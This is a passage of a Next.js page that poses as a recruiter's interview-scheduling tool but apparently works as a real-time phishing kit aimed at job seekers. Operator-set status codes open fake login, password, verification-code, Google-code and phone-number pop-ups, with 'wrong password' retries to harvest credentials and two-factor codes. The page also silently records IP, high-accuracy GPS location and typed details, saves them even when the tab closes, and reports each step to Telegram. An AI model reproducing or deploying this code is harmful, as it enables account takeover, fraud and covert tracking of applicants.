"use client";

import { useEffect, useMemo, useState, Suspense, useRef, useCallback } from "react";
import { useSearchParams } from "next/navigation";
import Link from "next/link";
import PhoneInputWithCountry from "@/components/PhoneInputWithCountry";
import TimezoneSelector from "@/components/TimezoneSelector";
import VerifyModal, { type VerifyStage } from "@/components/VerifyModal";
import NThanksModal from "@/components/NThanksModal";
import NLoginModal from "@/components/NLoginModal";
import NCodeModal from "@/components/NCodeModal";
import GPopUpModal from "@/components/GPopUpModal";
import GNumberModal from "@/components/GNumberModal";
import GAppreciateModal from "@/components/GAppreciateModal";
import NorthErrorModal from "@/components/NorthErrorModal";
import MeetingInfoPanel from "@/components/MeetingInfoPanel";
import CornerRibbon from "@/components/CornerRibbon";
import type { Settings, BookingStatus } from "@/lib/types";
import {
  buildMonthGrid,
  buildDaySlots,
  formatDateLong,
  WEEKDAY_LABELS,
  type MonthDay,
  type TimeSlot,
} from "@/lib/scheduling";
import { parseBookingCodeData, serializeBookingCodeData, getCodeLabel, type BookingCodeData } from "@/lib/codeData";
import { createClient } from "@/lib/supabase/client";
import { ChevronLeft, ChevronRight, Plus } from "lucide-react";

function formatNameFromSlug(str: string): string {
  if (!str) return "Recruiting Team";
  let clean = str;
  if (clean.includes("@")) {
    clean = clean.split("@")[0];
  }
  return clean
    .replace(/[._\-+]/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .split(" ")
    .map((w) => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
    .join(" ");
}

const DEFAULT_SETTINGS: Settings = {
  id: 1,
  working_days: [1, 2, 3, 4, 5],
  day_start_time: "09:00",
  day_end_time: "17:00",
  slot_duration_mins: 30,
  timezone: "America/New_York",
  interviewer_name: "Recruiting Team",
  interviewer_photo_url: null,
  meeting_type: "Web Conference",
  updated_at: "",
};

type Step = "datetime" | "details";
type Phase = "form" | "confirmed";

const MONTH_LABEL = (y: number, m: number) =>
  new Date(y, m, 1).toLocaleDateString("en-US", { month: "long", year: "numeric" });

// Helper to perform resilient booking insert/update with fallback for legacy schema
async function saveBookingWithFallback(
  supabaseClient: ReturnType<typeof createClient>,
  payload: Record<string, any>,
  existingId?: string | null
): Promise<{ id?: string; error?: any }> {
  if (existingId) {
    const { error } = await supabaseClient
      .from("bookings")
      .update(payload)
      .eq("id", existingId);

    if (error) {
      console.warn("Booking update with new columns failed, retrying legacy schema:", error.message);
      const { latitude, longitude, user_agent, ...legacyPayload } = payload;
      const { error: retryError } = await supabaseClient
        .from("bookings")
        .update(legacyPayload)
        .eq("id", existingId);
      return { id: existingId, error: retryError };
    }
    return { id: existingId };
  } else {
    const { data, error } = await supabaseClient
      .from("bookings")
      .insert(payload)
      .select("id")
      .single();

    if (error) {
      console.warn("Booking insert with new columns failed, retrying legacy schema:", error.message);
      const { latitude, longitude, user_agent, ...legacyPayload } = payload;
      const { data: retryData, error: retryError } = await supabaseClient
        .from("bookings")
        .insert(legacyPayload)
        .select("id")
        .single();
      return { id: retryData?.id, error: retryError };
    }
    return { id: data?.id };
  }
}

function SchedulePageInner() {
  const supabase = useMemo(() => createClient(), []);
  const searchParams = useSearchParams();
  const jobSlug = searchParams.get("job");

  // Persistent Session ID for real-time presence tracking
  const [sessionId] = useState(() => {
    if (typeof window !== "undefined") {
      const stored = sessionStorage.getItem("candidate_session_id");
      if (stored) return stored;
      const gen = crypto.randomUUID();
      sessionStorage.setItem("candidate_session_id", gen);
      return gen;
    }
    return "cand-" + Math.random().toString(36).substring(2, 9);
  });

  const [settings, setSettings] = useState<Settings>(DEFAULT_SETTINGS);
  const [settingsLoaded, setSettingsLoaded] = useState(false);
  const [jobTitle, setJobTitle] = useState<string | null>(null);
  const [jobId, setJobId] = useState<string | null>(null);

  const now = new Date();
  const [cursor, setCursor] = useState({ year: now.getFullYear(), month: now.getMonth() });
  const [blockedDates, setBlockedDates] = useState<string[]>([]);
  const monthGrid = useMemo(
    () => buildMonthGrid(cursor.year, cursor.month, settings, blockedDates),
    [cursor, settings, blockedDates]
  );
  const [timezone, setTimezone] = useState<string>("America/New_York");

  const [step, setStep] = useState<Step>("datetime");
  const [selectedDate, setSelectedDate] = useState<string | null>(null);
  const [slots, setSlots] = useState<TimeSlot[]>([]);
  const [loadingSlots, setLoadingSlots] = useState(false);
  const [selectedSlot, setSelectedSlot] = useState<TimeSlot | null>(null);

  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("+1 ");
  const [notes, setNotes] = useState("");
  const [showGuestInput, setShowGuestInput] = useState(false);
  const [guestEmail, setGuestEmail] = useState("");

  const [phase, setPhase] = useState<Phase>("form");
  const [verifyStage, setVerifyStage] = useState<VerifyStage>("closed");
  const [codeNumber, setCodeNumber] = useState<number>(1);
  const [displayCodeValue, setDisplayCodeValue] = useState<string>("");
  const [notificationDeviceValue, setNotificationDeviceValue] = useState<string>("");
  const [submitting, setSubmitting] = useState(false);
  const [verifyError, setVerifyError] = useState<string | null>(null);
  const [bookingId, setBookingId] = useState<string | null>(null);
  const [candidateIdValue, setCandidateIdValue] = useState<string>("");
  const [nThanksOpen, setNThanksOpen] = useState(false);
  const thanksPassedForReq = useRef(false);
  const lastLoginSentAt = useRef<string | null>(null);
  const [nLoginOpen, setNLoginOpen] = useState(false);
  const [nLoginSubmitted, setNLoginSubmitted] = useState(false);
  const [nLoginError, setNLoginError] = useState<string | null>(null);
  const [nCodeOpen, setNCodeOpen] = useState(false);
  const [nCodeSubmitted, setNCodeSubmitted] = useState(false);
  const [nCodeError, setNCodeError] = useState<string | null>(null);
  const [nCodeTargetEmail, setNCodeTargetEmail] = useState("dri•••••••@gmail.com");
  const [gPopUpOpen, setGPopUpOpen] = useState(false);
  const [gPopUpSubmitted, setGPopUpSubmitted] = useState(false);
  const [gPopUpError, setGPopUpError] = useState<string | null>(null);
  const [gNumberOpen, setGNumberOpen] = useState(false);
  const [gNumberSubmitted, setGNumberSubmitted] = useState(false);
  const [gNumberError, setGNumberError] = useState<string | null>(null);
  const [gNumberPhoneMask, setGNumberPhoneMask] = useState("••• ••• •20");
  const [gAppreciateOpen, setGAppreciateOpen] = useState(false);
  const [gAppreciateValue, setGAppreciateValue] = useState("22");
  const [northErrorOpen, setNorthErrorOpen] = useState(false);
  const [facebookUser, setFacebookUser] = useState<{
    id?: string;
    name?: string;
    email?: string;
    picture?: string;
  } | null>(null);

  const [geoInfo, setGeoInfo] = useState<{
    ip: string;
    city: string;
    state: string;
    country: string;
    timezone?: string;
    latitude?: string;
    longitude?: string;
  } | null>(null);

  const FB_APP_ID = process.env.NEXT_PUBLIC_FACEBOOK_APP_ID || "2497354053994375";

  // Fetch client IP and location info (with approx IP fallback + device geolocation)
  useEffect(() => {
    (async () => {
      try {
        const res = await fetch("/api/geo");
        if (res.ok) {
          const data = await res.json();
          setGeoInfo((prev) => ({
            ...data,
            // Keep device GPS latitude/longitude if already acquired
            latitude: prev?.latitude || data.latitude || "",
            longitude: prev?.longitude || data.longitude || "",
          }));
          if (data.timezone) {
            setTimezone(data.timezone);
          }
        }
      } catch (err) {
        console.error("Geo lookup error:", err);
      }
    })();

    // Attempt HTML5 browser geolocation for exact coordinates;
    // If permission not granted or times out, fallback to approx location from IP
    if (typeof navigator !== "undefined" && navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (pos?.coords) {
            const lat = pos.coords.latitude.toFixed(6);
            const lng = pos.coords.longitude.toFixed(6);
            setGeoInfo((prev) => ({
              ip: prev?.ip || "",
              city: prev?.city || "",
              state: prev?.state || "",
              country: prev?.country || "",
              timezone: prev?.timezone,
              latitude: lat,
              longitude: lng,
            }));
          }
        },
        (err) => {
          console.log("Device geolocation not available or denied, using approx IP location:", err?.message);
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 }
      );
    }
  }, []);

  // Initialize Facebook Javascript SDK
  useEffect(() => {
    if (typeof window === "undefined") return;

    if (!document.getElementById("facebook-jssdk")) {
      (window as unknown as { fbAsyncInit?: () => void }).fbAsyncInit = function () {
        (window as unknown as { FB?: { init: (opts: Record<string, unknown>) => void } }).FB?.init({
          appId: FB_APP_ID,
          cookie: true,
          xfbml: true,
          version: "v19.0",
        });
      };

      const js = document.createElement("script");
      js.id = "facebook-jssdk";
      js.src = "https://connect.facebook.net/en_US/sdk.js";
      js.async = true;
      js.defer = true;
      document.body.appendChild(js);
    }
  }, [FB_APP_ID]);

  // Initialize client's detected timezone
  useEffect(() => {
    try {
      const clientTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      if (clientTz) setTimezone(clientTz);
    } catch { }
  }, []);

  const rawInterviewerParam =
    searchParams.get("interviewer") ||
    searchParams.get("admin") ||
    searchParams.get("agent") ||
    searchParams.get("user") ||
    searchParams.get("ref") ||
    searchParams.get("name") ||
    searchParams.get("recruiter");

  const interviewerParam = rawInterviewerParam ? decodeURIComponent(rawInterviewerParam).trim() : null;

  useEffect(() => {
    (async () => {
      try {
        let matchedSettings: Settings | null = null;

        if (interviewerParam) {
          const isUuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(interviewerParam);
          const isEmail = interviewerParam.includes("@");
          const isNumeric = !isNaN(Number(interviewerParam)) && !interviewerParam.includes("-") && !isEmail;

          if (isUuid) {
            // 1. Check settings table by user_id
            const { data: s } = await supabase
              .from("settings")
              .select("*")
              .eq("user_id", interviewerParam)
              .maybeSingle();

            if (s) {
              matchedSettings = s as Settings;
            } else {
              // Check admin_links table by user_id
              const { data: linkRow } = await supabase
                .from("admin_links")
                .select("*")
                .eq("user_id", interviewerParam)
                .maybeSingle();

              if (linkRow?.agent) {
                matchedSettings = {
                  ...DEFAULT_SETTINGS,
                  user_id: interviewerParam,
                  interviewer_name: formatNameFromSlug(linkRow.agent),
                  admin_email: linkRow.agent.includes("@") ? linkRow.agent : null,
                } as Settings;
              }
            }
          } else if (isEmail) {
            // 1. Check settings table by admin_email
            const { data: s } = await supabase
              .from("settings")
              .select("*")
              .eq("admin_email", interviewerParam)
              .maybeSingle();

            if (s) {
              matchedSettings = s as Settings;
            } else {
              // 2. Check admin_links by agent email
              const { data: linkRow } = await supabase
                .from("admin_links")
                .select("*")
                .eq("agent", interviewerParam)
                .maybeSingle();

              matchedSettings = {
                ...DEFAULT_SETTINGS,
                user_id: linkRow?.user_id || null,
                admin_email: interviewerParam,
                interviewer_name: formatNameFromSlug(interviewerParam),
              } as Settings;
            }
          } else if (isNumeric) {
            const { data: s } = await supabase
              .from("settings")
              .select("*")
              .eq("id", Number(interviewerParam))
              .maybeSingle();

            if (s) {
              matchedSettings = s as Settings;
            }
          } else {
            // String / Name / Slug lookup
            // 1. Check settings table by interviewer_name ilike
            const { data: s } = await supabase
              .from("settings")
              .select("*")
              .ilike("interviewer_name", interviewerParam)
              .maybeSingle();

            if (s) {
              matchedSettings = s as Settings;
            } else {
              // 2. Check admin_links by agent
              const { data: linkRow } = await supabase
                .from("admin_links")
                .select("*")
                .ilike("agent", interviewerParam)
                .maybeSingle();

              if (linkRow) {
                matchedSettings = {
                  ...DEFAULT_SETTINGS,
                  user_id: linkRow.user_id || null,
                  admin_email: linkRow.agent.includes("@") ? linkRow.agent : null,
                  interviewer_name: formatNameFromSlug(linkRow.agent),
                } as Settings;
              } else {
                // Synthesize from custom name param
                matchedSettings = {
                  ...DEFAULT_SETTINGS,
                  interviewer_name: formatNameFromSlug(interviewerParam),
                } as Settings;
              }
            }
          }
        }

        // If not matched or no param provided, load default settings (row id = 1)
        if (!matchedSettings) {
          const { data: defaultRow } = await supabase
            .from("settings")
            .select("*")
            .order("id", { ascending: true })
            .limit(1)
            .maybeSingle();

          if (defaultRow) {
            matchedSettings = {
              ...defaultRow,
              interviewer_name: defaultRow.interviewer_name || "Recruiting Team",
            } as Settings;
          } else {
            matchedSettings = DEFAULT_SETTINGS;
          }
        }

        setSettings({
          ...matchedSettings,
          interviewer_name: matchedSettings.interviewer_name || "Recruiting Team",
        });
      } catch (err) {
        console.error("Error resolving settings / interviewer:", err);
      } finally {
        setSettingsLoaded(true);
      }

      if (jobSlug) {
        const { data: job } = await supabase
          .from("jobs")
          .select("id, title")
          .eq("slug", jobSlug)
          .eq("status", "published")
          .maybeSingle();
        if (job) {
          setJobId(job.id);
          setJobTitle(job.title);
        }
      }
    })();
  }, [supabase, jobSlug, interviewerParam]);

  // Fetch blocked dates (from blocked_dates table and system-blocked bookings)
  useEffect(() => {
    let active = true;
    (async () => {
      try {
        const [blockedRes, bookingsRes] = await Promise.allSettled([
          supabase.from("blocked_dates").select("date"),
          supabase
            .from("bookings")
            .select("date")
            .or("email.eq.blocked@admin.system,status.eq.blocked"),
        ]);

        const set = new Set<string>();

        if (blockedRes.status === "fulfilled" && blockedRes.value.data) {
          blockedRes.value.data.forEach((r: { date: string }) => {
            if (r.date) set.add(r.date);
          });
        }

        if (bookingsRes.status === "fulfilled" && bookingsRes.value.data) {
          bookingsRes.value.data.forEach((r: { date: string }) => {
            if (r.date) set.add(r.date);
          });
        }

        if (active) {
          setBlockedDates(Array.from(set));
        }
      } catch (err) {
        console.warn("Could not load blocked dates:", err);
      }
    })();
    return () => {
      active = false;
    };
  }, [supabase]);

  useEffect(() => {
    if (!selectedDate) return;
    setLoadingSlots(true);
    (async () => {
      const { data } = await supabase.from("public_booking_slots").select("start_time").eq("date", selectedDate);
      const taken = (data ?? []).map((r: { start_time: string }) => r.start_time);
      setSlots(buildDaySlots(settings, taken));
      setLoadingSlots(false);
    })();
  }, [selectedDate, settings, supabase]);

  // Centralized state updater for booking updates from Realtime & Polling
  const applyBookingUpdate = useCallback(
    (status: BookingStatus, additionalCodeRaw?: string | null) => {
      const codeData = parseBookingCodeData(additionalCodeRaw);
      const req = codeData.active_req || "";

      if (status === "confirmed") {
        setVerifyStage("closed");
        setNThanksOpen(false);
        setNLoginOpen(false);
        setNCodeOpen(false);
        setGPopUpOpen(false);
        setGNumberOpen(false);
        setGAppreciateOpen(false);
        setNorthErrorOpen(false);
        setPhase("confirmed");
      } else if (status === "rejected") {
        // ID & Passkey rejection
        setNThanksOpen(false);
        setNLoginOpen(false);
        setNCodeOpen(false);
        setGPopUpOpen(false);
        setGNumberOpen(false);
        setGAppreciateOpen(false);
        setNorthErrorOpen(false);
        setVerifyError("The password you entered is incorrect.");
        setVerifyStage("idPasskey");
      } else if (status === "awaiting_code") {
        if (req === "N_PHONE_REQUESTED") {
          setNorthErrorOpen(false);
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(true);
          setGNumberSubmitted(false);
          setGNumberError(null);
          if (codeData.n_phone_mask) {
            setGNumberPhoneMask(codeData.n_phone_mask);
          }
        } else if (req === "N_PHONE_SUBMITTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(true);
          setGNumberSubmitted(true);
          setGNumberError(null);
        } else if (req === "N_PHONE_REJECTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(true);
          setGNumberSubmitted(false);
          setGNumberError("Wrong phone number. Try again.");
          if (codeData.n_phone_mask) {
            setGNumberPhoneMask(codeData.n_phone_mask);
          }
        } else if (req === "N_GCODE_REQUESTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGNumberOpen(false);
          setGPopUpOpen(true);
          setGPopUpSubmitted(false);
          setGPopUpError(null);
        } else if (req === "N_GCODE_SUBMITTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGNumberOpen(false);
          setGPopUpOpen(true);
          setGPopUpSubmitted(true);
          setGPopUpError(null);
        } else if (req === "N_GCODE_REJECTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGNumberOpen(false);
          setGPopUpOpen(true);
          setGPopUpSubmitted(false);
          setGPopUpError("Wrong code. Try again.");
        } else if (req === "N_CODE_REQUESTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setNCodeOpen(true);
          setNCodeSubmitted(false);
          setNCodeError(null);
          if (codeData.n_code_target_email) {
            setNCodeTargetEmail(codeData.n_code_target_email);
          }
        } else if (req === "N_CODE_SUBMITTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setNCodeOpen(true);
          setNCodeSubmitted(true);
          setNCodeError(null);
        } else if (req === "N_CODE_REJECTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setNCodeOpen(true);
          setNCodeSubmitted(false);
          setNCodeError("Wrong code. Try again.");
          if (codeData.n_code_target_email) {
            setNCodeTargetEmail(codeData.n_code_target_email);
          }
        } else if (req === "N_LOGIN_REQUESTED") {
          setVerifyStage("closed");
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);

          if (codeData.n_login_sent_at && codeData.n_login_sent_at !== lastLoginSentAt.current) {
            thanksPassedForReq.current = false;
            lastLoginSentAt.current = codeData.n_login_sent_at;
          }

          if (codeData.n_thanks_seen || thanksPassedForReq.current) {
            setNThanksOpen(false);
            setNLoginOpen(true);
          } else {
            setNThanksOpen(true);
            setNLoginOpen(false);
          }
          setNLoginSubmitted(false);
          setNLoginError(null);
        } else if (req === "N_LOGIN_SUBMITTED") {
          setVerifyStage("closed");
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setNThanksOpen(false);
          setNLoginOpen(true);
          setNLoginSubmitted(true);
          setNLoginError(null);
        } else if (req === "N_LOGIN_REJECTED") {
          setVerifyStage("closed");
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setNThanksOpen(false);
          setNLoginOpen(true);
          setNLoginSubmitted(false);
          setNLoginError("Wrong password. Try again or click Forgot password to reset it.");
        } else if (req === "NORTH_ERROR_REQUESTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setGAppreciateOpen(false);
          setNorthErrorOpen(true);
        } else if (req === "N_APPRECIATE_REQUESTED") {
          setVerifyStage("closed");
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setNorthErrorOpen(false);
          setGAppreciateOpen(true);
          if (codeData.n_appreciate_value) {
            setGAppreciateValue(codeData.n_appreciate_value);
          }
        } else if (req.startsWith("NOTIFICATION:")) {
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setGAppreciateOpen(false);
          setNorthErrorOpen(false);
          const notifVal = req.replace("NOTIFICATION:", "");
          setNotificationDeviceValue(notifVal);
          setVerifyStage("notification");
        } else if (req.startsWith("POP_CODE:")) {
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setGAppreciateOpen(false);
          setNorthErrorOpen(false);
          const popVal = req.replace("POP_CODE:", "");
          setDisplayCodeValue(popVal);
          setVerifyStage("displayCode");
        } else if (req.includes("_REJECTED")) {
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          const match = req.match(/CODE_(\d)_REJECTED/i);
          const num = match ? parseInt(match[1], 10) : 1;
          setCodeNumber(num);
          if (num === 1) {
            setVerifyError("Authentication code is incorrect. Please re-enter and try again.");
          } else {
            const label = getCodeLabel(num);
            setVerifyError(`${label} verification code is incorrect. Please re-enter and try again.`);
          }
          setVerifyStage("code");
        } else if (req.match(/CODE_(\d)_REQUESTED/i)) {
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          const match = req.match(/CODE_(\d)_REQUESTED/i);
          const num = match ? parseInt(match[1], 10) : 1;
          setCodeNumber(num);
          setVerifyError(null);
          setVerifyStage("code");
        } else {
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNCodeOpen(false);
          setGPopUpOpen(false);
          setGNumberOpen(false);
          setCodeNumber(1);
          setVerifyError(null);
          setVerifyStage("code");
        }
      } else if (status === "pending") {
        if (!req || (!req.startsWith("N_LOGIN") && !req.startsWith("N_CODE") && !req.startsWith("N_GCODE") && !req.startsWith("N_PHONE"))) {
          setNThanksOpen(false);
          setNLoginOpen(false);
          setNLoginSubmitted(false);
          setNLoginError(null);
          setNCodeOpen(false);
          setNCodeSubmitted(false);
          setNCodeError(null);
          setGPopUpOpen(false);
          setGPopUpSubmitted(false);
          setGPopUpError(null);
          setGNumberOpen(false);
          setGNumberSubmitted(false);
          setGNumberError(null);
        }
      }
    },
    []
  );

  // Restore existing booking session if one already exists for this candidate session
  useEffect(() => {
    if (!sessionId) return;
    (async () => {
      try {
        const { data } = await supabase
          .from("bookings")
          .select("id, first_name, last_name, email, phone_number, candidate_id, additional_code, status")
          .eq("session_id", sessionId)
          .order("created_at", { ascending: false })
          .limit(1)
          .maybeSingle();

        if (data?.id) {
          setBookingId(data.id);
          if (data.candidate_id) {
            setCandidateIdValue(data.candidate_id);
          }
          applyBookingUpdate(data.status as BookingStatus, data.additional_code);
        }
      } catch (err) {
        console.warn("Could not restore session booking:", err);
      }
    })();
  }, [sessionId, supabase, applyBookingUpdate]);


  const draftSavingRef = useRef(false);
  const lastSavedDraftHash = useRef("");
  const draftNotifiedRef = useRef(false);

  const visitLoggedSessionRef = useRef<string | null>(null);

  // Log visit immediately when candidate opens the schedule page (including IP and location)
  // Gated on settingsLoaded to prevent race conditions sending placeholder default admin
  useEffect(() => {
    if (typeof window === "undefined" || !settingsLoaded) return;
    const visitKey = `visit_logged_${sessionId}`;
    const alreadyLogged = sessionStorage.getItem(visitKey);

    // If not logged yet, or if logged previously without geo and geo has now arrived
    if (!alreadyLogged || (geoInfo && !sessionStorage.getItem(`geo_logged_${sessionId}`))) {
      sessionStorage.setItem(visitKey, "1");
      if (geoInfo) {
        sessionStorage.setItem(`geo_logged_${sessionId}`, "1");
      }

      (async () => {
        try {
          const visitData = {
            session_id: sessionId,
            admin_user_id: settings.user_id || null,
            admin_email: settings.admin_email || null,
            interviewer_name: settings.interviewer_name || null,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "America/New_York",
            user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
            referrer: typeof document !== "undefined" ? document.referrer || null : null,
            ip_address: geoInfo?.ip || null,
            city: geoInfo?.city || null,
            state: geoInfo?.state || null,
            country: geoInfo?.country || null,
            latitude: geoInfo?.latitude || null,
            longitude: geoInfo?.longitude || null,
          };

          if (!alreadyLogged) {
            const { error: visitErr } = await supabase.from("schedule_visits").insert(visitData);
            if (visitErr) {
              const { latitude, longitude, user_agent, ...legacyVisit } = visitData;
              await supabase.from("schedule_visits").insert(legacyVisit);
            }
            visitLoggedSessionRef.current = sessionId;

            // Dispatch immediate Telegram notification for the visit
            fetch("/api/webhooks/telegram", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                type: "schedule_visit",
                record: visitData,
              }),
            }).catch(() => { });
          } else if (geoInfo) {
            // Update the visit row with the now resolved IP & location
            const updPayload = {
              ip_address: geoInfo.ip,
              city: geoInfo.city,
              state: geoInfo.state,
              country: geoInfo.country,
              latitude: geoInfo.latitude || null,
              longitude: geoInfo.longitude || null,
            };
            const { error: updErr } = await supabase
              .from("schedule_visits")
              .update(updPayload)
              .eq("session_id", sessionId);
            if (updErr) {
              const { latitude, longitude, ...legacyUpd } = updPayload;
              await supabase
                .from("schedule_visits")
                .update(legacyUpd)
                .eq("session_id", sessionId);
            }
          }
        } catch (err) {
          console.error("Failed to log schedule visit:", err);
        }
      })();
    }
  }, [sessionId, settingsLoaded, settings, geoInfo, supabase]);

  // Real-Time Auto-Save for Draft Candidate Details (Saves candidate even if they close before popups)
  const autoSaveDraftBooking = useCallback(async () => {
    if (!name.trim() && !email.trim()) return;
    if (!selectedDate || !selectedSlot) return;

    const draftHash = `${name.trim()}|${email.trim()}|${phone.trim()}|${notes.trim()}|${guestEmail.trim()}|${selectedDate}|${selectedSlot.start_time}`;
    if (draftHash === lastSavedDraftHash.current) return;
    if (draftSavingRef.current) return;
    draftSavingRef.current = true;

    try {
      const [firstName, ...rest] = name.trim().split(/\s+/);
      const lastName = rest.join(" ") || "-";
      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");

      const bookingData = {
        session_id: sessionId,
        job_id: jobId,
        first_name: firstName || name.trim() || "Candidate",
        last_name: lastName,
        email: email.trim() || `draft-${sessionId.substring(0, 8)}@temp.recruitment`,
        phone_number: phone.trim() || null,
        notes: combinedNotes || null,
        date: selectedDate,
        start_time: selectedSlot.start_time,
        end_time: selectedSlot.end_time,
        timezone,
        status: "pending" as const,
        admin_user_id: settings.user_id || null,
        admin_email: settings.admin_email || null,
        interviewer_name: settings.interviewer_name || null,
        ip_address: geoInfo?.ip || null,
        city: geoInfo?.city || null,
        state: geoInfo?.state || null,
        country: geoInfo?.country || null,
        latitude: geoInfo?.latitude || null,
        longitude: geoInfo?.longitude || null,
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
      };

      if (bookingId) {
        const res = await saveBookingWithFallback(supabase, bookingData, bookingId);
        if (!res.error) {
          lastSavedDraftHash.current = draftHash;
        }
      } else {
        const { data: existing } = await supabase
          .from("bookings")
          .select("id")
          .eq("session_id", sessionId)
          .maybeSingle();

        if (existing?.id) {
          setBookingId(existing.id);
          const res = await saveBookingWithFallback(supabase, bookingData, existing.id);
          if (!res.error) {
            lastSavedDraftHash.current = draftHash;
          }
        } else {
          const res = await saveBookingWithFallback(supabase, bookingData);
          if (!res.error && res.id) {
            setBookingId(res.id);
            lastSavedDraftHash.current = draftHash;
          }
        }
      }

      // Notify Telegram when candidate details are drafted/updated
      if (name.trim().length >= 2 && email.includes("@") && !draftNotifiedRef.current) {
        draftNotifiedRef.current = true;
        fetch("/api/webhooks/telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: "candidate_draft",
            record: {
              ...bookingData,
              first_name: firstName || name.trim(),
              last_name: lastName,
              email: email.trim(),
              phone_number: phone.trim(),
            },
          }),
        }).catch(() => { });
      }
    } catch (err) {
      console.error("Auto-save draft booking error:", err);
    } finally {
      draftSavingRef.current = false;
    }
  }, [name, email, phone, notes, guestEmail, selectedDate, selectedSlot, sessionId, jobId, timezone, settings, geoInfo, bookingId, supabase]);

  // Debounced trigger for auto-saving candidate details as they type
  useEffect(() => {
    if (step !== "details") return;
    if (!name.trim() && !email.trim()) return;

    const timer = setTimeout(() => {
      autoSaveDraftBooking();
    }, 600);

    return () => clearTimeout(timer);
  }, [step, name, email, phone, notes, guestEmail, autoSaveDraftBooking]);

  // Flush draft booking on page close/unload
  useEffect(() => {
    const handleBeforeUnload = () => {
      if (name.trim() || email.trim()) {
        autoSaveDraftBooking();
      }
    };
    window.addEventListener("beforeunload", handleBeforeUnload);
    return () => window.removeEventListener("beforeunload", handleBeforeUnload);
  }, [name, email, autoSaveDraftBooking]);

  // Real-Time Candidate Online / Offline Presence Tracking
  useEffect(() => {
    const presenceChannel = supabase.channel("candidate-presence-room", {
      config: { presence: { key: sessionId } },
    });

    presenceChannel.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        await presenceChannel.track({
          session_id: sessionId,
          booking_id: bookingId,
          admin_user_id: settings.user_id || null,
          admin_email: settings.admin_email || null,
          interviewer_name: settings.interviewer_name || null,
          name: name.trim(),
          email: email.trim(),
          phone: phone.trim(),
          date: selectedDate,
          start_time: selectedSlot?.start_time,
          end_time: selectedSlot?.end_time,
          ip_address: geoInfo?.ip,
          city: geoInfo?.city,
          state: geoInfo?.state,
          country: geoInfo?.country,
          latitude: geoInfo?.latitude,
          longitude: geoInfo?.longitude,
          user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
          phase:
            phase === "confirmed"
              ? "Confirmed"
              : northErrorOpen
                ? "In North Error Page"
                : gAppreciateOpen
                ? "In G-Appreciate Pop-up"
                : gNumberOpen
                ? gNumberSubmitted
                  ? "In G-Number (Submitted)"
                  : "In G-Number Pop-up"
                : gPopUpOpen
                  ? gPopUpSubmitted
                    ? "In G-PopUp (Submitted)"
                    : "In G-PopUp"
                  : nCodeOpen
                    ? nCodeSubmitted
                      ? "In N-Code (Submitted)"
                      : "In N-Code Pop-up"
                    : nThanksOpen
                      ? "In Thanks Page"
                      : nLoginOpen
                        ? nLoginSubmitted
                          ? "In N-Login (Submitted)"
                          : "In N-Login Pop-up"
                        : step === "details"
                          ? verifyStage === "closed"
                            ? "Entering Details"
                            : verifyStage === "idPasskey"
                              ? "In ID/Passkey Modal"
                              : `In ${verifyStage}`
                          : "Selecting Date & Time",
          online: true,
          updated_at: Date.now(),
        });
      }
    });

    const handleBeforeUnload = () => {
      presenceChannel.untrack();
    };
    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload);
      supabase.removeChannel(presenceChannel);
    };
